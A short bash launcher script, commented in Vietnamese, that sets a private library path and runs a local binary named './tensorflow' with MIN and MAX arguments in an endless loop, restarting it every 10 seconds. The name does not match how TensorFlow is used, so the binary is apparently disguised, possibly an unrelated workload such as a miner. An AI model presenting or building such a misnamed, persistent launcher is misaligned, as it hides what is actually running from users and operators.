#!/bin/bash
MIN=$1
MAX=$2

if [ -d "$HOME/dependencies" ]; then
    export LD_LIBRARY_PATH=$HOME/dependencies/lib/x86_64-linux-gnu:$HOME/dependencies/usr/lib/x86_64-linux-gnu:$LD_LIBRARY_PATH
fi

while true; do
    if [ -z "$MAX" ]; then
        # Nếu không có MAX, chỉ chạy với MIN
        ./tensorflow $MIN
    else
        # Nếu có MAX, chạy với cả MIN và MAX
        ./tensorflow $MIN,$MAX
    fi
    sleep 10
done
